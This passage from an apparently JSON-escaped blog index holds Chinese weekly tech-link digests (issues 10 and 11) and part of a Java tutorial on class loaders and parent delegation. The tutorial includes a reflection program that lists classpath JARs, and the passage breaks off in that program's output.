D8编译器“bug”导致Crash的问题排查](https://mp.weixin.qq.com/s/483_hesZalaGRPebzz5tPA)\n这篇文章主要是分析了一个因为 Android D8 编译器分配的寄存器不太合理，导致运行时 ART 抛出了 VerifyError 而 Crash 的问题，下文简单分析了下问题产生的原因以及我们采用的修复方案。\n- [移动端UI一致性解决方案](https://tech.meituan.com/2020/11/26/consistency-in-ui-design.html)\nUI一致性是绝大部分研发团队面临的共性问题，大家对落地设计规范，提高UI中台能力，提升产研效率具有强烈的诉求。通过UI一致性的建设，不仅可以在品牌上实现体验升级，更可以全面提高产研效率，为业务的快速迭代提供有力支持和有效保障。统一的品牌符号、品牌特征，有助于加深产品在用户心目中的印象。统一的用户界面和交互形式，能帮助用户加深对产品的熟悉感和信任感。而一个好的设计语言可以在体验上为产品加分，也能够更好的创造一致性体验。\n- [干货 | 响应式设计在携程火车票的应用](https://mp.weixin.qq.com/s/ddTUxQEEnIb_b1PzN_JRJA)\n可能很多人脑海中已经出现了这样一个动画，当浏览器中页面尺寸不断变化时，内容也在随之变化。简单说，响应式网站设计是一种允许设计和代码响应设备屏幕大小的方法。\n- [UME - 丰富的Flutter调试工具](https://mp.weixin.qq.com/s/9GjXB9Eu-OP3fIjdQWKklg)\n目前西瓜视频作者侧 Flutter 业务场景已经覆盖了 40多个页面 (包括视频播放场景)，用户侧核心场景包括我的 Tab 也已经是 Flutter，在开发过程中，暴露了一些问题，debug 调试难、离开了 IDE 后犹如抓瞎、PM 设计 QA 验收过程中拿不到有用的信息，在市面上找了一圈，也没有类似 iOS Flex 这样强大的调试工具，例如视图大小、层级的展示，实例对象属性的实时修改，网络请求抓取，log 日志打印，文件查看等，所以西瓜视频 Flutter 基础团队决定开发 UME。\n\n\n## 架构\n- [携程多语言平台-Shark系统的高可用演进之路](https://tech.ctrip.com/articles/a_architecture/11686/)\nShark是携程IBU国际化进程中孵化的集多语言内容管理、多语言翻译、多语言内容下发等功能为一体的多语言平台，目前为携程海外几十个站点和上千个业务应用提供稳定的多语言内容管理和下发服务。本文主要分享携程IBU多语言团队在提升系统稳定性过程中的一些实践和总结，希望给大家一些参考和帮助。\n- [淘系面向业务价值的精细化流量管控实战-双11实录](https://juejin.cn/post/6898494817563901960)\n本文将从背景问题、实战效果、设计思路与解法三个方面介绍马克尼(Marconi)在2020双11中，保障了淘系（淘宝、天猫等）核心业务平台（如 首页、会场、直播、互动、我的淘宝 等），多架构层次（从接入网关到业务应用集群/容器）管控业务流量并提升服务业务效果，给予用户顺滑的体验；提升了淘系(及阿里巴巴集团更多的BU)的稳定性底盘，成为应用稳定性保障的核心能力，推动了业界在大型分布式在线业务系统的高可用/稳定性保障进展。为今年双11创新纪录提供保障！\n\n## 人工智能\n- [美团无人车引擎在仿真中的实践](https://tech.meituan.com/2020/11/27/self-driving-in-simulation-system.html)\n过去几年，自动驾驶技术有了飞速发展。国内也出现了许多自动驾驶创业企业，这些公司以百度开源项目Apollo为起点，大都可以直接进行公开道路测试，公开道路测试也成为促进技术进步的主要方法。基础问题得以解决之后，行业面临的更多是长尾问题，依靠路测驱动自动驾驶能力建设的方式变得不再高效，离线仿真的地位日益凸显。行业头部企业在仿真的投入十分巨大，Waymo公司2019年公布的仿真里程是100亿英里，是路测里程的1000倍。相应地，美团无人车团队在仿真上的投入也在逐渐增大。在仿真平台的建设中，团队发现公开道路测试和仿真测试看似相似，实际上差异巨大：在车载环境下，为了确保系统的稳定运行，通常要保证一定资源处于空闲状态；仿真环境则不同，如何高效利用资源，如何实现压榨资源的同时确保仿真结果与路测结果一致成为了关键目标。在应对这些挑战的过程中，美团提出了无人车引擎的概念，将车载与离线环境的差异隔离起来：功能模块无需任何更改便可以满足两种场景的需要。\n\n\n## 深度学习\n- [TensorFlow Serving 模型更新毛刺的完全优化实践](https://mp.weixin.qq.com/s/DkCGusznH8F8p39oRLuNBQ)\n在点击率CTR（Click Through Rate）预估算法的推荐场景中使用 Tensorflow Serving热更新较大模型时会出现短暂的延时毛刺，导致业务侧超时，降低算法效果，为了解决这个问题，爱奇艺深度学习平台团队经过多个阶段的优化实践，最后对 TF Serving 和 Tensorflow 的源码进行深入优化，将模型热更新时的毛刺现象解决，本文将分享Tensorflow Serving的优化细节，希望对大家有帮助。\n- [日志异常检测初步实践与探索](https://mp.weixin.qq.com/s/ame9XL218FK1Du_by3_L5A)\n日志的主要目的是记录系统（包括服务和业务等）状态和重要的事件帮助定位系统的问题。日志对于理解系统状态和定位性能问题至关重要。因此，日志是在线监控和异常检测的一个重要信息源。在很多业务和服务的故障自愈过程中，日志异常检测与根因分析是必不可少的一环。但是之前我们通常都使用人工的方式来定位问题，主要包括人工检测与分析和人工学习错误日志提取正则表达式来进行故障定位这两种方式。\n\n\n## 近期会议\n\n### 第十一届中国数据库技术大会（DTCC2020）\n\n报名链接：http://dtcc.it168.com/\n\n会议时间：2020年12月21日 ~ 1010年12月23日\n\n2020年12月21日~12月23日，由 IT168 旗下 ITPUB 企业社区平台主办的第十一届中国数据库技术大会（DTCC2020），将在北京隆重召开。大会以“架构革新 高效可控”为主题，设置2大主会场，20+技术专场，将邀请超百位行业专家，重点围绕数据架构、AI与大数据、传统企业数据库实践和国产开源数据库等内容展开分享和探讨，为广大数据领域从业人士提供一场年度盛会和交流平台。\n\n为了帮助更多企业落地数据项目实施方案，今年将继续开设多门深度培训课程，内容涵盖数据中台、去IOE实践、区块链技术、内核开发实践等。3天传统技术演讲+1天深度主题，将汇聚各行业精英、技术领袖、行业专家和数据英雄，带来超过100场主题演讲和超5场培训课程的头脑风暴，诚邀您的加入。\n\n历经十年的积累与沉淀，如今的DTCC已然成为国内数据库领域的技术风向标，见证了整个行业的发展与演变。作为顶级的数据领域技术盛会，DTCC2020将继续秉承一贯的干货分享和实践指导原则，期待大家的热情参与！\n\n### 第十届PostgreSQL中国技术大会\n\n报名链接：http://pgconf2020.postgres.cn/\n\n会议时间：2021年1月15日 ~ 2021年1月16日\n\n2021年1月15～1月16日，由 PostgreSQL 中文社区主办的第十届《PostgreSQL 中国技术大会》将在南京索菲特银河大酒店现场隆重举办。\n\nPostgreSQL 作为功能最强的的开源关系型数据库之一，得到了越来越多企业的推广和运用，也越来越受到广大技术爱好者的欢迎和重视。\n\n本次大会以“开源，自研，新机遇”为主题。除了设立一个主会场外，还设立了多个分会场。大会汇聚了来自互联网、电商、教育，金融等各行业领域的专家，这将是 PostgreSQL 发展史上的又一次交流盛会。\n\n\n## 其他周报\n\n- [科技爱好者周刊（第 135 期）：什么行业适合创业？](https://github.com/ruanyf/weekly/blob/master/docs/issue-135.md)\n\n- [Go语言爱好者周刊：第 71 期](https://github.com/polaris1119/golangweekly/blob/master/docs/issue-071.md)\n\n- [2020.11.23 - Moving my serverless project to Ruby on Rails](https://github.com/zenany/weekly/blob/master/software/2020/1123.md)\n\n- [老司机 iOS 周报 #138 | 2020-11-30](https://github.com/SwiftOldDriver/iOS-Weekly/blob/master/Reports/2020/%23137-2020.11.30.md)\n\n- [R Weekly 2020-47 NHS-R, testthat utility belt, bayesian networks](https://rweekly.org/2020-47.html)\n\n","categories":["技术爱好者周刊"],"tags":["技术爱好者周刊"]},{"title":"技术爱好者周刊 第10期 | 2020年12月07日","url":"//weekly-010/","content":"\n> 技术爱好者周刊，每周一发布，欢迎提[issue](https://github.com/wangyonghong/yonghong-me/issues)贡献内容。\n\n\n## 后端\n- [ClickHouse集群搭建（一）](https://niocoder.com/2020/11/28/ClickHouse%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA1/)\n- [ClickHouse集群搭建（二）](https://niocoder.com/2020/11/29/ClickHouse%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA2/)\nClickHouse 是俄罗斯的Yandex于2016年开源的列式存储数据库（DBMS），主要用于在线分析处理查询（OLAP），能够使用SQL查询实时生成分析数据报告。\n- [ReentrantLock 的这几个问题，你都知道吗？](http://generalthink.github.io/2020/11/23/about-ReentrantLock-problems/)\n之前分析 AQS 的时候，了解到 AQS 依赖于内部的两个 FIFO 队列来完成同步状态的管理，当线程获取锁失败的时候，会将当前线程以及等待状态等信息构造成 Node 对象并将其加入同步队列中，同时会阻塞当前线程。当释放锁的时候，会将首节点的 next 节点唤醒 (head 节点是虚拟节点)，使其再次尝试获取锁。\n- [复杂环境下落地Service Mesh的挑战与实践](https://tech.meituan.com/2020/12/03/service-mesh-in-meituan.html)\n在私有云集群环境下建设 Service Mesh ，往往需要对现有技术架构做较大范围的改造，同时会面临诸如兼容困难、规模化支撑技术挑战大、推广困境多等一系列复杂性问题。本文会系统性地讲解在美团在落地 Service Mesh 过程中，我们面临的一些挑战及实践经验，希望能对大家有所启发或者帮助。\n- [CDN工作原理及其在淘宝图片业务中的应用](https://juejin.cn/post/6901479190244098062)\n淘宝的图片访问，有98%的流量都走了CDN缓存，只有2%会回源到源站，节省了大量的服务器资源。但是，如果在用户访问高峰期，图片内容大批量发生变化，大量用户的访问就会穿透cdn，对源站造成巨大的压力。今年双11，淘宝鹿班的主图价格表达升级项目，就面临了这种挑战，让我们看看是如何解决的吧。\n<!-- more -->\n\n## 人工智能\n- [CIKM 2020 | 一文详解美团6篇精选论文](https://tech.meituan.com/2020/12/03/cikm-2020-nlp.html)\nAI平台/搜索与NLP部/NLP中心/知识图谱组共有六篇论文（其中4篇长文，2篇短文）被国际会议CIKM2020接收，这些论文是知识图谱组在多模态知识图谱、MT-BERT、Graph Embedding和图谱可解释性等方向上的技术沉淀和应用。\n\n\n## 近期会议\n\n### 第十一届中国数据库技术大会（DTCC2020）\n\n报名链接：http://dtcc.it168.com/\n\n会议时间：2020年12月21日 ~ 1010年12月23日\n\n2020年12月21日~12月23日，由 IT168 旗下 ITPUB 企业社区平台主办的第十一届中国数据库技术大会（DTCC2020），将在北京隆重召开。大会以“架构革新 高效可控”为主题，设置2大主会场，20+技术专场，将邀请超百位行业专家，重点围绕数据架构、AI与大数据、传统企业数据库实践和国产开源数据库等内容展开分享和探讨，为广大数据领域从业人士提供一场年度盛会和交流平台。\n\n为了帮助更多企业落地数据项目实施方案，今年将继续开设多门深度培训课程，内容涵盖数据中台、去IOE实践、区块链技术、内核开发实践等。3天传统技术演讲+1天深度主题，将汇聚各行业精英、技术领袖、行业专家和数据英雄，带来超过100场主题演讲和超5场培训课程的头脑风暴，诚邀您的加入。\n\n历经十年的积累与沉淀，如今的DTCC已然成为国内数据库领域的技术风向标，见证了整个行业的发展与演变。作为顶级的数据领域技术盛会，DTCC2020将继续秉承一贯的干货分享和实践指导原则，期待大家的热情参与！\n\n### 第十届PostgreSQL中国技术大会\n\n报名链接：http://pgconf2020.postgres.cn/\n\n会议时间：2021年1月15日 ~ 2021年1月16日\n\n2021年1月15～1月16日，由 PostgreSQL 中文社区主办的第十届《PostgreSQL 中国技术大会》将在南京索菲特银河大酒店现场隆重举办。\n\nPostgreSQL 作为功能最强的的开源关系型数据库之一，得到了越来越多企业的推广和运用，也越来越受到广大技术爱好者的欢迎和重视。\n\n本次大会以“开源，自研，新机遇”为主题。除了设立一个主会场外，还设立了多个分会场。大会汇聚了来自互联网、电商、教育，金融等各行业领域的专家，这将是 PostgreSQL 发展史上的又一次交流盛会。\n\n## 其他周报\n\n- [科技爱好者周刊（第 136 期）：利特伍德奇迹定律](https://github.com/ruanyf/weekly/blob/master/docs/issue-136.md)\n\n- [Go语言爱好者周刊：第 72 期](https://github.com/polaris1119/golangweekly/blob/master/docs/issue-072.md)\n\n- [2020.11.30 - FrontPage: The Good, The Bad, and The Ugly](https://github.com/zenany/weekly/blob/master/software/2020/1130.md)\n\n- [老司机 iOS 周报 #138 | 2020-12-07](https://github.com/SwiftOldDriver/iOS-Weekly/blob/master/Reports/2020/%23137-2020.12.07.md)\n\n- [R Weekly 2020-48 Your first R package, magrittr, engineering Shiny](https://rweekly.org/2020-48.html)\n\n","categories":["技术爱好者周刊"],"tags":["技术爱好者周刊"]},{"title":"技术爱好者周刊 第11期 | 2020年12月14日","url":"//weekly-011/","content":"\n> 技术爱好者周刊，每周一发布，欢迎提[issue](https://github.com/wangyonghong/yonghong-me/issues)贡献内容。\n\n\n## 后端\n- [C++服务编译耗时优化原理及实践](https://tech.meituan.com/2020/12/10/apache-kylin-practice-in-meituan.html)\n大型C++工程项目，都会面临编译耗时较长的问题。不管是开发调试迭代、准入测试，亦或是持续集成阶段，编译行为无处不在，降低编译时间对提高研发效率来说具有非常重要意义。\n- [爱奇艺微服务标准技术架构实践](https://mp.weixin.qq.com/s/2soLr1F0X7rc8fZ-2fTE6A)\n为数以亿计的用户提供优质的视频服务的爱奇艺技术产品团队，为了适应业务的快速迭代和创新，并支撑海量的用户请求，很多团队都对各自的业务系统自发地进行了微服务架构的改造。\n- [步入超高清视频时代视频编码技术的机遇与挑战——AV1时代要来了](https://mp.weixin.qq.com/s/lHGC9JeKb3okVuuQy3zCWg)\n近些年随着视频行业的迅猛发展，尤其像短视频、点播、直播、VR等领域的爆发，人们对于高清、超高清视频体验的追求越来越强烈，流媒体平台如何在提升观众观看体验，同时降低播放成本，利用技术降低带宽消耗的同时又能最大化的还原视频的画质和质量，成为了重要的课题。\n- [一文彻底理解 I/O 多路复用](https://mp.weixin.qq.com/s/LkCoaUE5sl88J90iVwln9A)\n这里的关键点在于，我们事先并不知道一个文件描述对应的I/O设备是否是可读的、是否是可写的，在外设的不可读或不可写的状态下进行I/O只会导致进程阻塞被暂停运行。\n- [10 张图告诉你，Kafka 是怎么做到支持百万级 TPS 的？](https://mp.weixin.qq.com/s/ViHKf9cB3n_IjS4LUHyzKQ)\n谈到大数据传输都会想到 Kafka，Kafka 号称大数据的杀手锏，在业界有很多成熟的应用场景并且被主流公司认可。这款为大数据而生的消息中间件，以其百万级TPS的吞吐量名声大噪，迅速成为大数据领域的宠儿，在数据采集、传输、存储的过程中发挥着举足轻重的作用。在业界已经有很多成熟的消息中间件如：RabbitMQ, RocketMQ, ActiveMQ, ZeroMQ，为什么 Kafka 在众多的敌手中依然能有一席之地，当然靠的是其强悍的吞吐量。下面带领大家来揭秘。\n\n<!-- more -->\n\n## 大数据\n- [Apache Arrow：一种适合异构大数据系统的内存列存数据格式标准](https://tech.ipalfish.com/blog/2020/12/08/apache_arrow_summary/)\n本文介绍一种内存列存数据格式：Apache Arrow，它有一个非常大的愿景：提供内存数据分析 (in-memory analytics) 的开发平台，让数据在异构大数据系统间移动、处理地更快。同时，比较特别的是这个项目的启动形式与其他项目也不相同，Arrow 项目的草台班子由 5 个 Apache Members、6 个 PMC Chairs 和一些其它项目的 PMC 及 committer 构成，他们直接找到 ASF 董事会，征得同意后直接以顶级 Apache 项目身份启动。\n\n## 近期会议\n\n### 第十一届中国数据库技术大会（DTCC2020）\n\n报名链接：http://dtcc.it168.com/\n\n会议时间：2020年12月21日 ~ 1010年12月23日\n\n2020年12月21日~12月23日，由 IT168 旗下 ITPUB 企业社区平台主办的第十一届中国数据库技术大会（DTCC2020），将在北京隆重召开。大会以“架构革新 高效可控”为主题，设置2大主会场，20+技术专场，将邀请超百位行业专家，重点围绕数据架构、AI与大数据、传统企业数据库实践和国产开源数据库等内容展开分享和探讨，为广大数据领域从业人士提供一场年度盛会和交流平台。\n\n为了帮助更多企业落地数据项目实施方案，今年将继续开设多门深度培训课程，内容涵盖数据中台、去IOE实践、区块链技术、内核开发实践等。3天传统技术演讲+1天深度主题，将汇聚各行业精英、技术领袖、行业专家和数据英雄，带来超过100场主题演讲和超5场培训课程的头脑风暴，诚邀您的加入。\n\n历经十年的积累与沉淀，如今的DTCC已然成为国内数据库领域的技术风向标，见证了整个行业的发展与演变。作为顶级的数据领域技术盛会，DTCC2020将继续秉承一贯的干货分享和实践指导原则，期待大家的热情参与！\n\n### 第十届PostgreSQL中国技术大会\n\n报名链接：http://pgconf2020.postgres.cn/\n\n会议时间：2021年1月15日 ~ 2021年1月16日\n\n2021年1月15～1月16日，由 PostgreSQL 中文社区主办的第十届《PostgreSQL 中国技术大会》将在南京索菲特银河大酒店现场隆重举办。\n\nPostgreSQL 作为功能最强的的开源关系型数据库之一，得到了越来越多企业的推广和运用，也越来越受到广大技术爱好者的欢迎和重视。\n\n本次大会以“开源，自研，新机遇”为主题。除了设立一个主会场外，还设立了多个分会场。大会汇聚了来自互联网、电商、教育，金融等各行业领域的专家，这将是 PostgreSQL 发展史上的又一次交流盛会。\n\n## 其他周报\n\n- [科技爱好者周刊（第 137 期）：Slack 被收购，以及企业的技术选型](https://github.com/ruanyf/weekly/blob/master/docs/issue-137.md)\n\n- [Go语言爱好者周刊：第 73 期](https://github.com/polaris1119/golangweekly/blob/master/docs/issue-073.md)\n\n- [2020.12.07 - Flying the Nest: WebThings Gateway 1.0](https://github.com/zenany/weekly/blob/master/software/2020/1207.md)\n\n- [老司机 iOS 周报 #139 | 2020-12-14](https://github.com/SwiftOldDriver/iOS-Weekly/blob/master/Reports/2020/%23137-2020.12.14.md)\n\n- [R Weekly 2020-49 ggplot2, static code analysis, visual CV](https://rweekly.org/2020-49.html)\n\n","categories":["技术爱好者周刊"],"tags":["技术爱好者周刊"]},{"title":"Java 进阶 03 —— 类加载器和双亲委派到底是什么？","url":"/java-advance/03-jvm-classloader/","content":"\n## 类加载子系统作用\n\n- 类加载子系统负责从文件系统或者网络中加载 Class 文件，Class 文件在文件开头有特定的文件标识（cafebabe）\n- ClassLoader 只负责 Class 文件的加载，至于它是否能够运行，则由 Execution Engine 决定\n- 加载的类信息存放于一块称为方法区的内存空间。除了类的信息外，方法区还存放运行时常量池信息，可能还包含字符串字面值和数字常量（这部分常量信息是 Class 文件中常量池部分的内存映射）\n\n<!-- more -->\n\n## 类加载器的角色\n\n![类加载器的角色](https://up-img.yonghong.tech/pic/2021/04/03-20-16-U6ND22-TgTnLm.png)\n\n- class file 存放于本地硬盘上，可以理解成设计师画在纸上的模板，最终这个模板在执行的时候要加载到 JVM 中来，根据这个文件实例化出 n 个一模一样的实例\n- class file 加载到 JVM 中，被称为 DNA 原数据模板，放在方法区\n- 在 class 文件 -> JVM -> 最终成为原数据模板，此过程需要一个运输工具，即类加载器 Class Loader，扮演一个快递员的角色\n\n\n## 类的生命周期\n\n![类生命周期的7个步骤](https://up-img.yonghong.tech/pic/2021/04/02-20-18-01-%E7%B1%BB%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%9A%847%E4%B8%AA%E6%AD%A5%E9%AA%A4-r3r8RQ.png)\n\n1. 加载（Loading）：找Class文件\n2. 验证（Verification）：验证格式、依赖\n3. 准备（Preparation）：静态字段、方法表\n4. 解析（Resolution）：符号解析为引用\n5. 初始化（Initialization）：构造器、静态变量赋值、静态代码块\n6. 使用（Using）\n7. 卸载（Unloading）\n\n### Loading 阶段\n\n1. 通过一个类的全限定名获取定义此类的二进制字节流\n\n2. 将这个字节流所代表的的静态存储结构转化为方法区的运行时数据区\n\n3. **在内存中生成一个代表这个类的 java.lang.Class 对象**，作为方法区这个类的各种数据的访问入口\n\n补充：加载 class 文件的方式\n\n- 从本地系统中直接加载\n- 通过网络获取，典型场景：Web Applet\n- 从 zip 压缩包中读取，成为日后 jar、war 格式的基础\n- 运行时计算生成，使用最多的是：动态代理技术\n- 由其他文件生成，典型场景：JSP 应用\n- 从专有数据库中提取 class 文件，比较少见\n- 从加密文件中获取，典型的防 class 文件被反编译的保护措施\n\n### Linking 阶段\n\n1.验证（Verify）：\n- 目的在于确保 class 文件的字节流中包含信息符合当前虚拟机要求，保证被加载类的正确性，不会危害虚拟机的自身安全\n- 主要包括四种验证：文件格式验证，元数据验证，字节码验证，符号引用验证\n\n2.准备（Prepare）：\n\n- 为类变量分配内存并且设置该类变量的默认初始值，即零值\n- 这里不包含用 final 修饰的 static，因为 final 在编译的时候就会分配了，准备阶段会显示初始化\n- 这里不会为实例变量分配初始值，类变量会分配在方法区中，而实例变量是会随着对象一起分配到 Java 堆中\n\n3.解析（Resolve）：\n\n- 将常量池内的符号引用转换为直接引用的过程\n- 事实上，解析操作往往会伴随着 JVM 在执行完初始化之后再执行\n- 符号引用就是一组符号来描述所引用的目标。符号引用的字面量形式明确定义在《Java 虚拟机规范》的 class 文件格式中。直接引用就是直接指向目标的指针、相对偏移量或者一个间接定位到目标的句柄\n- 解析动作主要针对类或接口、字段、类方法、接口方法、方法类型等。对应常量池中的 CONSTANT_Class_info、CONSTANT_Fieldref_info、CONSTANT_Methodref_info 等。\n\n### Initialization 阶段\n\n- 初始化阶段就是执行类构造器方法 `<clinit>()` 的过程\n- 此方法不需要定义，是 javac 编译器自动收集类中所有类变量的赋值动作和静态代码块中的语句合并而来\n- 构造器方法中指令按语句在源文件中出现的顺序执行\n- `<clinit>()` 不同于类的构造器。（关联：构造器是虚拟机视角下的 `<init>()`）\n- 若该类具有父类，JVM 会保证子类的 `<clinit>()` 执行前，父类的 `clinit()` 已经执行完毕\n- 虚拟机必须保证一个类的 `clinit()` 方法在多线程下被同步加载\n\n\n## 类的加载时机\n\n1. 当虚拟机启动时，初始化用户指定的主类，就是启动执行的main方法所在的类；\n2. 当遇到用一新建目标类实例的new指令时，初始化new指令的目标类，就是new一个类的时候要初始化；\n3. 当遇到调用静态方法的指令时，初始化该静态方法所在的类；\n4. 当遇到访问静态字段的指令时，初始化该静态字段所在的类；\n5. 子类的初始化会触发父类的初始化；\n6. 如果一个接口定义了default方法，那么直接实现或者间接实现该接口的类初始化，会触发该接口的初始化；\n7. 使用反射API对某个类型进行反射调用时，初始化这个类，其实跟前面一样，反射调用要么是已经有实例了，要么是静态方法，都需要初始化；\n8. 当初次调用MethodHandle实例时，初始化该MethodHandle指向的方法所在的类；\n\n### 不会初始化（可能会加载）\n\n1. 通过子类引用父类的静态字段，只会触发父类的初始化，而不会触发子类的初始化；\n2. 定义对象数组，不会触发该类的初始化；\n3. 常量在编译期间会存入调用类的常量池中，本质上并没有直接引用定义常量的类，不会触发定义常量所在的类；\n4. 通过类名获取Class对象，不会触发类的初始化，Hello.class不会让Hello类初始化；\n5. 通过Class.forName加载指定类时，如果指定参数initialize为false时，也不会触发类初始化，其实这个参数是告诉虚拟机，是否要对类进行初始化，Class.forName(\"jvm.Hello\") 默认会加载Hello类；\n6. 通过ClassLoader默认的loadClass方法，也不会触发初始化动作（加载了，但是不会初始化）；\n\n## 虚拟机自带的加载器\n\n![3个类加载器](https://up-img.yonghong.tech/pic/2021/04/02-20-23-01-3%E4%B8%AA%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8-pnd3RO.png)\n\n- 启动类加载器（引导类加载器，Bootstrap ClassLoader）\n  - 这个类加载器使用 C/C++ 语言实现的，嵌套在 JVM 内部\n  - 它用来加载 Java 的核心库（JAVA_HOME/jre/lib/rt.jar、resources.jar 或 sun.boot.class.path 路径下的内容），用于提供 JVM 自身需要的类\n  - 并不继承自 java.lang.ClassLoader，没有父加载器。\n  - 加载拓展类和应用程序类加载器，并指定为他们的父类加载器\n  - 出于安全考虑，Bootstrap 启动类加载器只加载包名为 java、javax、sun 等开头的类\n- 拓展类加载器（Extension ClassLoader）\n  - Java 语言编写，由 sun.misc.Launcher$ExtClassLoader 实现\n  - 派生于 ClassLoader 类\n  - 父类加载器为启动类加载器\n  - 从 java.ext.dirs 系统属性所指定的目录中加载类库，或从 JDK 的安装目录的 jre/lib/ext 子目录（拓展目录）下加载类库。如果用户创建的 JAR 放在此目录下，也会自动由拓展类加载器加载\n- 应用程序类加载器（系统类加载器，AppClassLoader）\n  - java 语言编写，由 sun.misc.Launcher$AppClassLoader 实现\n  - 派生于 ClassLoader 类\n  - 父类加载器为拓展类加载器\n  - 他负责加载环境变量 classpath 或系统属性 java.class.path 指定路径下的类库\n  - 该类加载是程序中默认的类加载器，一般来说，Java 应用的类都是由它来完成加载\n  - 通过 ClassLoader$getSystemClassLoader() 方法可以获取到该类加载器\n\n\n类加载器可以通过getParent获取父加载器，这并不是继承关系，如果直接继承ClassLoader自己实现一个类加载器，且不指定父加载器，他的父加载器就是AppClassLoader\n\n任何parent为null的加载器，其父加载器为 BootstrapClassLoader\n\n![拓展类加载器和应用类加载器](https://up-img.yonghong.tech/pic/2021/04/02-20-26-01-%E6%8B%93%E5%B1%95%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%92%8C%E5%BA%94%E7%94%A8%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8-PRIfeU.png)\n\n## 加载器特点\n\n### 双亲委托\n\nJava 虚拟机对 class 文件采用的是按需加载的方式，也就是说当需要使用该类时才会将它的 class 文件加载到内存生成 class 对象。而且加载某个类的 class 文件时，Java 虚拟机采用的是双亲委派模式，即把请求交由父类处理，它是一种任务委派模式。\n\n- 如果一个类加载器收到了类加载的请求，它并不会自己先去加载，而是把这个请求委托给父类的加载器去执行\n- 如果父类加载器还存在其他父类加载器，则进一步向上委托，依次递归请求最终将到达顶层的启动类加载器\n- 如果父类加载器可以完成类的加载任务，就成功返回，倘若父类加载器无法完成此加载任务，子加载器才会尝试自己去加载，这就是双亲委派机制\n\n**优势**\n\n- 避免类的重复加载\n- 保护程序安全，防止核心 API 被随意篡改\n\n**沙箱安全机制**\n\n自定义 String 类，但是在加载自定义 String 类的时候会率先使用引导类加载器加载，而引导类加载器在加载过程中会率先加载 JDK 自带的文件（rt.jar 包中 java/lang/String.class），报错信息说没有 main 方法，就是因为加载的是rt.jar 包中的 String 类。这样可以保证对 Java 核心源代码的保护，这就是沙箱安全机制。\n\n在 JVM 中表示两个 class 对象是否为同一个类存在两个必要条件：\n\n- 类的完整类名必须一致，包括包名\n- 加载这个类的 ClassLoader （指 ClassLoader 实例对象）必须相同\n\n换句话说，在 JVM 中，即使这两个类对象（class 对象）来源于同一个 Class 文件，被同一个虚拟机所加载，但只要加载它们的 ClassLoader 实例对象不同，那么这两个类对象也是不相等的。\n\nJVM 必须知道一个类型是由启动加载器加载的还是由用户类加载器加载的。如果一个类型是由用户类加载器加载的，那么 JVM 会将这个类加载器的一个引用作为类型信息的一部分保存在方法区中。当解析一个类型到另一个类型的引用的时候，JVM 需要保证这两个类型的类加载器是相同的。\n\n\n### 负责依赖\n\n如果一个类依赖了其他的类，那么就需要先加载依赖的类。\n\n### 缓存加载\n\n类加载之后，就把它缓存起来，后续从缓存中获取\n\n## 关于 ClassLoader\n\nClassLoader 类，它是一个抽象类，其后所有的类加载器都继承自 ClassLoader （不包括启动类加载器）\n\n| 方法名称                                             | 描述                                                         |\n| ---------------------------------------------------- | ------------------------------------------------------------ |\n| getParent()                                          | 返回该类加载器的超类加载器                                   |\n| loadClass(String name)                               | 加载名称为 name 的类，返回结果为 java.lang.Class 类的实例    |\n| findClass(String name)                               | 查找名称为 name 的类，返回结果为 java.lang.Class 类的实例    |\n| findLoadedClass(String name)                         | 查找名称为 name 的已经被加载过的类，返回结果为 java.lang.Class 类的实例 |\n| defineClass(String name, byte[] b, int off, int len) | 把字节数组 b 中的内存转换成为一个 Java 类，返回结果为 java.lang.Class 类的实例 |\n| resolveClass(Class<?> c)                             | 连接指定的一个 Java 类                                       |\n\n## 获取 ClassLoader 的途径\n\n方式一：获取当前类的 ClassLoader\n\nclazz.getClassLoader()\n\n方式二：获取当前线程上下文的 ClassLoader\n\nThread.currentThread().getContextClassLoader()\n\n方式三：获取系统的ClassLoader\n\nClassLoader.getSystemClassLoader()\n\n方式四：获取调用者的 CLassLoader\n\nDriverManager.getCallerClassLoader()\n\n## 显示当前 ClassLoader 加载了哪些 Jar ？\n\n```java\nimport java.lang.reflect.Field;\nimport java.net.URL;\nimport java.net.URLClassLoader;\nimport java.util.ArrayList;\n\npublic class JvmClassLoaderPrintPath {\n\n    public static void main(String[] args) {\n        // 启动类加载器\n        URL[] urls = sun.misc.Launcher.getBootstrapClassPath().getURLs();\n        System.out.println(\"启动类加载器\");\n        for (URL url : urls) {\n            System.out.println(\" ===> \" + url.toExternalForm());\n        }\n\n        // 拓展类加载器\n        printClassLoader(\"拓展类加载器\", JvmClassLoaderPrintPath.class.getClassLoader().getParent());\n        // 应用类加载器\n        printClassLoader(\"应用类加载器\", JvmClassLoaderPrintPath.class.getClassLoader());\n\n    }\n\n\n    public static void printClassLoader(String name, ClassLoader classLoader) {\n        if (classLoader != null) {\n            System.out.println(name + \" ClassLoader -> \" + classLoader.toString());\n            printUrlForClassLoader(classLoader);\n        } else {\n            System.out.println(name + \" ClassLoader -> null\");\n        }\n    }\n\n    public static void printUrlForClassLoader(ClassLoader classLoader) {\n        Object ucp = insightField(classLoader, \"ucp\");\n        Object path = insightField(ucp, \"path\");\n        ArrayList ps = (ArrayList) path;\n        for (Object p : ps) {\n            System.out.println(\" ===> \" + p.toString());\n        }\n    }\n\n    private static Object insightField(Object obj, String fName) {\n        try {\n            Field f = null;\n            if (obj instanceof URLClassLoader) {\n                f = URLClassLoader.class.getDeclaredField(fName);\n            } else {\n                f = obj.getClass().getDeclaredField(fName);\n            }\n            f.setAccessible(true);\n            return f.get(obj);\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n}\n```\n\n```shell\n启动类加载器\n ===> file:/Users/yq/.sdkman/candidates/java/8.0.275.hs-adpt/jre/lib/resources.jar\n ===> file:/Users/yq/.sdkman/candidates/java/8.0.275.hs-adpt/jre/lib/rt.jar\n ===> file:/Users/yq/.sdkman/candidates/java/8.0.275.hs-adpt/jre/lib/sunrsasign.jar\n ===> file:/Users/yq/.sdkman/candidates/java/8.0.275.hs-adpt/jre/lib/jsse.jar\n ===> file:/Users/yq/.sdkman/candidates/java/8.0.275.hs-adpt/jre/lib/jce.jar\n ===> file:/Users/yq/.sdkman/candidates/java/8.0.275.hs-adpt/jre/lib/charsets.jar\n ===> 